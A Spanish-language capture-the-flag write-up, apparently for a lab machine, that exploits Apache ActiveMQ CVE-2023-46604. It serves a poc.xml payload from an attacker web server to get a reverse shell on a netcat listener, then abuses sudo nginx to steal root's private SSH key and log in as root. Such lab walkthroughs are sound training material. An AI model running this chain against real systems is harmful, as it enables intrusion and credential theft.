Enumeración Nmap Link to heading

Comando:

nmap -p- --open -sS -vvv --min-rate 5000 -n -Pn 10.10.11.35 -oG allPorts
Interesante información sobre servicio mqtt y amqp relacionados con dispositivos IoT. Información más importante sobre puerto 61616

Enumeración puerto HTTP 80 Link to heading

Al abrir el puerto 80 nos piden credenciales, utilizando credenciales básicas (admin:admin) entramos y tenemos página ActiveMQ

Analizando la ruta http://10.10.11.243/admin/ encontramos información importante sobre la versión de ActiveMQ 5.15.15

Buscando posibles CVE de la version Link to heading

Encontramos CVE-2023-46604 que afecta a la versión 5.15.15 por tanto buscamos alguna forma de explotar este CVE.

Encontramos un script en Github Analizando el código y su manual tenemos los siguiente, su uso: agregamos nuestra IP y un puerto para enviar la reverseshell en el archivo poc.xml

Explotación CVE Link to heading

Usamos el script Comando:

python3 exploit.py -ip 10.10.11.243 -c http://10.10.14.15/poc.xml

Hosteamos un servidor web para compartir el archivo poc.xml Comando:

python3 -m http.server 80

Escuchamos con netcad por el puerto 4444 Comando:

nc -nlvp 4444

y obtenemos la reverse shell:

Escalada de privilegios Link to heading

Realizamos el tratamiento de la tty típico: Comando:

script /dev/null -c bash
ctrl+z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 40 columns 140

Estando en la máquina buscamos usuarios que contengan shell: Teniendo solo dos usuarios disponibles. Buscamos privilegios sudoers con Comando:

sudo -l
Tenemos privilegios de sudo para ```/usr/sbin/nginx``` sin la necesidad de proporcionar contraseñas, por tanto buscamos alguna forma de elevar privilegios con nginx Encontramos un script en github bastante interesante

lo descargamos en la máquina víctima en la ruta /home/activemq le damos permiso de ejecución chmod +x exploit.py

Corremos el script: Link to heading

y obtenemos la clave rsa privada del usuario root de la máquina víctima, por tanto la copiamos y la depositamos en nuestra máquina local.

Máquina local: Link to heading

Le damos el permiso 600 para que nos deje conectarnos por SSH

Y nos conectamos con el siguiente comando: Comando:

ssh -i key root@10.10.11.243

y obtenemos la conexión ssh del usuario root de la máquina victima obteniendo la flag de root.txt
